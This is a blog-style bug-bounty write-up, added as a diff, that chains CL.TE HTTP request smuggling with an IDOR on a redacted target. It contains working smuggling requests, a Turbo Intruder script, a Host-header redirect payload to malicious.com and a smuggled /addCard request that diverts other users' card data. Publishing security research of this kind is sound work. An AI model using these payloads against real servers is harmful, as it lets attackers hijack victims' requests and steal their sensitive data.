@@ -1,0 +1,155 @@
+---
+layout: page
+title: HTTP Request Smuggling + IDOR
+date: 05/12/2019
+description: A bug chain of HTTP Request Smuggling and an IDOR which allows to retrieve user sensitive data
+---
+
+<p><b>HTTP Request Smuggling</b> or <b>HTTP Desync</b> is one of the trendy vulnerabilities of the moment and one of my favorites, because it allows you to greatly increase the severity of most common bugs. Here, in this first of a series of HTTP Request Smuggling chained vulnerabilities I've found, I'll explain how I chained it with a inoffensive <b>IDOR</b> to retrieve some user highly confidential information.</p> 
+
+<p>Everything is redacted and highly modified to not disclose this bug bounty program's information.</p>
+
+<hr>
+
+
+<p>All started thanks to <a href="https://github.com/PortSwigger/http-request-smuggler" target="_blank">Burp's Request Smuggler plugin</a> with which I detected a possible vulnerable <code>CL.TE</code> endpoint.</p>
+
+<img class="img-fluid" src="/static/img/bb/http-desync-idor/0.png">
+
+<p>I like to create my own pocs to confirm if an endpoint is indeed vulnerable, so I used the following crafted request to test this <code>CL.TE</code>.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+ Transfer-Encoding: chunked
+Host: xxx.com
+Content-Length: 35
+Foo: bar
+
+0
+
+GET /admin7 HTTP/1.1
+X-Foo: k
+</pre>
+
+<p>What I try to achieve with this request is:</p>
+
+<ul>
+<li>The front-end uses the <code>Content-Length</code> header, forwarding the whole request.</li>
+<li>The back-end uses <code>Transfer-Encoding: chunked</code> processing only the <code>0</code> which means end of the request.</li>
+<li>The remaining part (<code>GET /admin7</code>...) is processed with the next request the back-end receives. (I used <code>/admin7</code> knowing it returned a <code>302</code> code, to make it easier to identify).</li>
+</ul> 
+
+<p>In the following pictures it's possible to see the expected behavior.</p>
+
+<p>Since the back-end uses <code>Transfer-Encoding: chunked</code> it will only answer till the <code>0</code> returning a <code>404</code> (the default code for a <code>POST</code> to <code>/</code>) and leaving the remaining part unprocessed.</p>
+
+<img class="img-fluid" width="75%" src="/static/img/bb/http-desync-idor/3.png">
+
+<p>When the next request arrives (<code>GET /</code>), that remaining part is processed with it, modifying the other user's request.</p>
+
+<img class="img-fluid" width="75%" src="/static/img/bb/http-desync-idor/4.png">
+
+<p>This can be achieved with the following <b>Turbo Intruder</b> script.</p>
+
+<pre class="prettyprint long">
+def queueRequests(target, wordlists):
+
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           resumeSSL=False,
+                           timeout=10,
+                           pipeline=False,
+                           maxRetriesPerRequest=0,
+                           engine=Engine.THREADED,
+                           )
+    engine.start()
+
+    attack = '''POST / HTTP/1.1
+ Transfer-Encoding: chunked
+Host: xxx.com
+Content-Length: 35
+Foo: bar
+
+0
+
+GET /admin7 HTTP/1.1
+X-Foo: k'''
+
+    engine.queue(attack)
+
+    victim = '''GET / HTTP/1.1
+Host: xxx.com
+
+'''
+    for i in range(14):
+        engine.queue(victim)
+        time.sleep(0.05)
+
+def handleResponse(req, interesting):
+    table.add(req)
+</pre>
+
+<p>We can see how the malicious request is sent first and then, 14 simple <code>GET</code> to <code>/</code> which return a <code>404</code>.</p>
+
+<img class="img-fluid" src="/static/img/bb/http-desync-idor/1.png">
+
+<p>But since this system is vulnerable, one of those simple <code>GET</code> was internally modified by our malicious request and returns a different response (the <code>302</code> which corresponds to <code>/admin7</code>).</p>
+
+<img class="img-fluid" src="/static/img/bb/http-desync-idor/2.png">
+
+<p>What I usually try in these situations is changing the <code>Host</code> header in order to redirect the victim to a different website which will be already considered as a high vulnerability.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+ Transfer-Encoding: chunked
+Host: xxx.com
+Content-Length: 55
+Foo: bar
+
+0
+
+POST /admin7 HTTP/1.1
+Host: <b>malicious.com</b>
+Content-Length: 100
+
+kk
+</pre>
+
+<p>Unfortunately this nor any request trying to append the victim's req in the body of my target request didn't work, which made me think that maybe an internal header was being set internally and only requests with that header were processed.</p>
+
+<p>I tried to find an endpoint which would allow me to reflect internal headers, but I couldn't find any, instead I found something better, a hidden <b>swagger</b> with all user endpoint's documentation.</p>
+
+<p>I started testing that API, I was able to create my own user and found that some endpoints were potentially vulnerable to <b>IDOR</b>.</p>
+
+<p>For example, this endpoint (<code>/addCard</code>) which allowed to add a credit card to your account (in reality it wasn't credit cards, but this is easier to understand). You can see how any authorization header nor session cookie is being used, only the user id is needed (<code>675ygtyt675erp</code>) to add a new card.</p>
+
+<pre class="prettyprint">
+POST /addCard/675ygtyt675erp HTTP/1.1
+Host: xx.com
+Content-Type: application/json
+Content-Length: 83
+
+{"name": "Name","card": "12345", "exp": "00/00", "cvv": "000"}
+</pre>
+
+<p>But just this behavior shouldn't be considered a real vulnerability, since why would someone add a valid credit card to another user?</p>
+
+<p>Here comes how with HTTP Request Smuggling we can turn this into an <b>IDOR on steroids</b>.</p>
+
+<pre class="prettyprint">
+POST / HTTP/1.1
+ Transfer-Encoding: chunked
+Host: xxx.com
+Content-Length: 70
+Foo: bar
+
+0
+
+POST /addCard/675ygtyt675erp HTTP/1.1
+x-ff: kk
+</pre>
+
+<p>Using that request what I'm doing is modifying the path of the next request and if that next request happens to be an <code>addCard</code> request, the card will be added to an account under my control (<code>675ygtyt675erp</code>) being able to retrieve that information.</p>
+
+<img class="img-fluid" width="80%" src="/static/img/bb/http-desync-idor/5.png">
